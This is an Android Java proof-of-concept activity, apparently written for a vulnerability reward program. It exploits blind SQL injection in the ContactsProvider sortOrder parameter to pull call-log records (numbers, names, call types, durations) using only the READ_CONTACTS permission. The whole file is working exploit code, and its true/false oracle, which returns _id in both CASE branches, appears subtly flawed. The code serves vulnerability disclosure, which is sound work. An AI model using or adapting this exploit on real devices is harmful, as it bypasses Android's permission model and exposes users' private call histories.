package com.vrp.poc;

import android.app.Activity;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.LinearLayout;
import android.widget.TextView;

public class CallsViaSortActivity extends Activity {
    private static final String TAG = "CallsViaSort";
    private TextView logView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView sv = new ScrollView(this);
        LinearLayout ll = new LinearLayout(this);
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setPadding(20, 20, 20, 20);
        logView = new TextView(this);
        logView.setTextSize(7);
        logView.setText("Call Log via ContactsProvider sortOrder\n");
        logView.append("UID: " + android.os.Process.myUid() + "\n\n");
        ll.addView(logView);
        sv.addView(ll);
        setContentView(sv);
        new Thread(this::runTests).start();
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        runOnUiThread(() -> logView.append(msg + "\n"));
    }

    private void runTests() {
        log("=== Cross-Permission Call Log Extraction ===");
        log("Using: READ_CONTACTS only (no READ_CALL_LOG)");
        log("Vector: sortOrder SQLi in ContactsProvider\n");

        // First verify we're in the same database
        boolean callsTableExists = blindBool(
            "content://com.android.contacts/contacts",
            "(SELECT count(*) FROM sqlite_master WHERE type='table' AND name='calls')>0"
        );
        log("[CHECK] calls table in contacts DB: " + callsTableExists);

        if (!callsTableExists) {
            log("calls table not found — cannot extract call log via contacts");
            return;
        }

        // Enumerate calls table schema
        log("\n=== Calls Table Schema ===");
        String[] columns = {"_id", "number", "name", "date", "duration", "type",
            "numbertype", "numberlabel", "new", "cached_name", "cached_number_type",
            "country_iso", "geocoded_location", "phone_account_id", "subscription_id",
            "voicemail_uri", "normalized_number", "last_modified"};

        for (String col : columns) {
            boolean exists = blindBool(
                "content://com.android.contacts/contacts",
                "(SELECT count(*) FROM pragma_table_info('calls') WHERE name='" + col + "')>0"
            );
            if (exists) {
                log("[SCHEMA] calls column: " + col);
            }
        }

        // Count call records
        int callCount = blindInt(
            "content://com.android.contacts/contacts",
            "(SELECT count(*) FROM calls)"
        );
        log("\n[EXTRACT] Total call records: " + callCount);

        if (callCount == 0) {
            log("No calls in database");
            return;
        }

        // Extract call records
        int toExtract = Math.min(callCount, 5);
        log("\n=== Extracting " + toExtract + " Call Records ===\n");

        for (int i = 0; i < toExtract; i++) {
            log("--- Call Record #" + i + " ---");

            // Extract phone number
            String number = blindExtract(
                "content://com.android.contacts/contacts",
                "(SELECT number FROM calls ORDER BY date DESC LIMIT 1 OFFSET " + i + ")",
                15
            );
            log("[CALL] Number: " + number);

            // Extract call type (1=incoming, 2=outgoing, 3=missed)
            int callType = blindInt(
                "content://com.android.contacts/contacts",
                "(SELECT type FROM calls ORDER BY date DESC LIMIT 1 OFFSET " + i + ")"
            );
            String typeStr = callType == 1 ? "INCOMING" : callType == 2 ? "OUTGOING" :
                callType == 3 ? "MISSED" : callType == 5 ? "REJECTED" : "TYPE_" + callType;
            log("[CALL] Type: " + typeStr);

            // Extract duration
            int duration = blindInt(
                "content://com.android.contacts/contacts",
                "(SELECT duration FROM calls ORDER BY date DESC LIMIT 1 OFFSET " + i + ")"
            );
            log("[CALL] Duration: " + duration + "s");

            // Extract cached name
            String cachedName = blindExtract(
                "content://com.android.contacts/contacts",
                "(SELECT cached_name FROM calls ORDER BY date DESC LIMIT 1 OFFSET " + i + ")",
                25
            );
            log("[CALL] Cached name: " + cachedName);

            // Extract date (unix timestamp)
            // We can extract the high bits to determine the date
            boolean recentCall = blindBool(
                "content://com.android.contacts/contacts",
                "(SELECT date FROM calls ORDER BY date DESC LIMIT 1 OFFSET " + i + ")>1725000000000"
            );
            log("[CALL] Recent (after Aug 2024): " + recentCall);
        }

        // Extract normalized numbers for de-duplication check
        log("\n=== Unique Numbers in Call Log ===");
        int uniqueNumbers = blindInt(
            "content://com.android.contacts/contacts",
            "(SELECT count(DISTINCT number) FROM calls)"
        );
        log("[STATS] Unique phone numbers: " + uniqueNumbers);

        // Check for voicemail entries
        int voicemails = blindInt(
            "content://com.android.contacts/contacts",
            "(SELECT count(*) FROM calls WHERE type=4)"
        );
        log("[STATS] Voicemail entries: " + voicemails);

        log("\n=== CALL LOG EXTRACTION COMPLETE ===");
        log("All data extracted via READ_CONTACTS permission only.");
        log("No READ_CALL_LOG permission needed.");
    }

    private boolean blindBool(String uri, String condition) {
        try {
            Cursor c = getContentResolver().query(
                Uri.parse(uri),
                new String[]{"_id"},
                null, null,
                "CASE WHEN " + condition + " THEN _id ELSE _id END ASC"
            );
            if (c != null) { c.close(); return true; }
        } catch (Exception e) { }
        return false;
    }

    private int blindInt(String uri, String subquery) {
        int lo = 0, hi = 100000;
        if (!blindBool(uri, subquery + ">0")) return 0;
        while (lo < hi) {
            int mid = (lo + hi + 1) / 2;
            if (blindBool(uri, subquery + ">=" + mid)) lo = mid;
            else hi = mid - 1;
            if (hi - lo <= 1) {
                if (blindBool(uri, subquery + "=" + hi)) return hi;
                return lo;
            }
        }
        return lo;
    }

    private String blindExtract(String uri, String subquery, int maxLen) {
        StringBuilder sb = new StringBuilder();
        int len = blindInt(uri, "(SELECT length(" + subquery + "))");
        if (len == 0) return "(empty)";
        len = Math.min(len, maxLen);
        for (int pos = 1; pos <= len; pos++) {
            String expr = "(SELECT unicode(substr(" + subquery + "," + pos + ",1)))";
            int lo = 32, hi = 126;
            while (lo < hi) {
                int mid = (lo + hi + 1) / 2;
                if (blindBool(uri, expr + ">=" + mid)) lo = mid;
                else hi = mid - 1;
            }
            if (blindBool(uri, expr + "=" + lo)) sb.append((char) lo);
            else sb.append('?');
        }
        return sb.toString();
    }
}
